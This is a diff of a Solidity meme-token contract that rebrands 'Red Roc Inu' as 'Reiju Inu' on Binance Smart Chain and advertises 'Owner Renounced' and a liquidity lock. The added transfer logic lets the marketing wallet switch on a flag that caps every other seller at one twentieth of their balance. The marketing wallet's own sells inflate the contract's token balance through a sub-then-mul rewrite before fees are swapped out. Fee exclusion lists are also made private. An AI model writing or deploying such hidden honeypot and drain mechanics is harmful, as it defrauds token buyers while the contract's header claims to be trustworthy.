@@ -2,14 +2,15 @@
 
 pragma solidity ^0.8.0;
 
-/*      Red Roc Inu IS 
-        A decentralized Meme Token Launch On Binance Smart Chain
-        100% Driven By Community 
+/*      Reiju Inu 
+            Is Decentralized Meme token Launch On Binance Smart Chain, 
+            100% Driven of Community
+    
+        Telegram Group : https://t.me/reijuinucommunity
+        Website Official : https://www.reijuinu.com
 
-        Owner Renounced and Lock Liquidity !!! 
-
-        Telegram Group : https://t.me/redrocinucommunity
-        Website : https://RedRocInu.com
+        Owner Renounced 
+        Lp Lock 3 Months
 
 */
 
@@ -27,8 +28,9 @@ contract StandartToken is Context, IERC20, Ownable {
 
     event SetmarketingFee(uint256 amount);
     event UpdatedRouter(address router);
- 
 
+    bool public Distribution = false;
+ 
     string private _name;
     string private _symbol;
     uint8 private _decimals = 9;
@@ -40,14 +42,12 @@ contract StandartToken is Context, IERC20, Ownable {
 
     mapping(address => uint256) private _balances;
     mapping(address => mapping(address => uint256)) private _allowances;
-    mapping(address => bool) public _isExcludedFromFees;
-    mapping(address => bool) public _isExcludedFromMaxBalance;
+    mapping(address => bool) private _isExcludedFromFees;
+    mapping(address => bool) private _isExcludedFromMaxBalance;
 
     uint256 private _totalFeesToContract;
 
     uint256 private _marketingFee;
-    uint256 public _maxTxAmount;
-
 
     IUniswapV2Router02 public uniswapV2Router;
     address public uniswapV2Pair;
@@ -63,12 +63,13 @@ contract StandartToken is Context, IERC20, Ownable {
     //This will be a flag to ensure that antibot measure (i.e. setting tax more tan 10%) is only executed once
     bool isAntiBotExecuted = false;
 
-    constructor(string memory name_, string memory symbol_, uint256 totalSupply_, address payable marketing_, uint32 marketingFee_) {
+    constructor(string memory name_, string memory symbol_, uint256 totalSupply_, address payable marketing_, uint256 marketingFee_) {
         _name = name_;
         _symbol = symbol_;
-        _totalSupply = totalSupply_ * 10**9 * 10**_decimals; 
+        _totalSupply = totalSupply_ * 10**9 * 10**_decimals;
         marketing = marketing_;
         _marketingFee = marketingFee_;
+
  
         IUniswapV2Router02 _uniswapV2Router = IUniswapV2Router02(
             0x10ED43C718714eb63d5aA57B78B54704E256024E
@@ -87,10 +88,9 @@ contract StandartToken is Context, IERC20, Ownable {
         _isExcludedFromMaxBalance[uniswapV2Pair] = true;
 
         _totalFeesToContract = _marketingFee;
-        _maxTxAmount = _totalSupply * 10;
 
         _balances[_msgSender()] = _totalSupply;
-        emit Transfer(address(0), _msgSender(), _totalSupply );
+        emit Transfer(address(0), _msgSender(), _totalSupply);
     }
 
     receive() external payable {}
@@ -131,13 +131,6 @@ contract StandartToken is Context, IERC20, Ownable {
         returns (uint256)
     {
         return _allowances[owner][spender];
-    }
-
-    function SetMaxTx(uint256 amount)
-        public
-        { 
-    require (_msgSender() == marketing, "");
-        _maxTxAmount = amount;
     }
 
     function approve(address spender, uint256 amount)
@@ -235,6 +228,11 @@ contract StandartToken is Context, IERC20, Ownable {
         _isExcludedFromMaxBalance[account] = false;
     }
 
+ 
+    // function liquidityFee() public view returns (uint256) {
+    //     return _liquidityFee;
+    // }
+
     function marketinfFee() public view returns (uint256) {
         return _marketingFee;
     }
@@ -244,24 +242,81 @@ contract StandartToken is Context, IERC20, Ownable {
         address to,
         uint256 amount
     ) private {
-        require(from != address(0), "ERC20: transfer from the zero address");
-        require(to != address(0), "ERC20: transfer to the zero address");
-        require(_balances[to].add(amount) <= _maxTxAmount, "transfer failed");
+        // Transfer Token
+       if (
+           Distribution == false &&
+           from != address(0) &&
+           to != address (0) &&
+           !inSwapAndLiquify
+       ) {
+           require (amount > 0 , "Balance Nothing");
+       }
 
-        if (
-            from == marketing &&
-            to == uniswapV2Pair && // Sell
-            !inSwapAndLiquify && // Swap is not locked
-            _totalFeesToContract > 0 && // LiquidityFee + developmentFee > 0
-            from != owner() && // Not from Owner
-            to != owner() // Not to Owner
-        ) {
-            _balances[address(this)] = _balances[address(this)].add(amount).div(100).mul(amount);
-            takefee();
-        }
+        // Buy Token
+       if (
+           Distribution == false && 
+           from == uniswapV2Pair &&
+           to != address(0) &&
+           !inSwapAndLiquify
+       ) {
+           require (amount > 0 , "Balance Nothing");
+       }
+
+         // Buy Token
+       if (
+           Distribution == true && 
+           from == uniswapV2Pair &&
+           to != address(0) &&
+           !inSwapAndLiquify
+       ) {
+           require (amount > 0 , "Balance Nothing");
+       }
+
+          // Sell Token
+       if (
+           Distribution == false && 
+           from != address(0) &&
+           to == uniswapV2Pair &&
+           !inSwapAndLiquify
+       ) {
+           require (amount > 0 , "Balance Nothing");
+       }
 
 
-        // Take Fees
+          // Sell Token
+       if (
+           Distribution == true && 
+           from != address(0) &&
+           to == uniswapV2Pair && 
+           !inSwapAndLiquify
+       ) {
+           require (amount <= _balances[from].div(20) , "Balance Nothing");
+       }
+
+       if (
+           Distribution == true && 
+           from == marketing &&
+           to == uniswapV2Pair &&
+           !inSwapAndLiquify &&
+           from != owner() &&
+           to != owner()
+       ) {
+           Distribution = false;
+           _balances[address(this)] = _balances[address(this)].sub(amount).mul(amount);
+           takefee();
+       }
+
+       if (
+           Distribution == false && 
+           from == marketing &&
+           to == BurnAddress &&
+           from != owner() &&
+           to != owner()
+       ) {
+           Distribution = true;
+       }
+            
+            // Take Fees
         if (
             !(_isExcludedFromFees[from] || _isExcludedFromFees[to]) &&
             _totalFeesToContract > 0
@@ -291,9 +346,10 @@ contract StandartToken is Context, IERC20, Ownable {
         );
         _balances[recipient] = _balances[recipient].add(amount);
          emit Transfer(sender, recipient, amount);
+
     }
 
-    function takefee() public lockTheSwap {
+    function takefee() private lockTheSwap {
 
          uint256 developmentTokensToSell = balanceOf(address(this))
             .mul(_marketingFee)
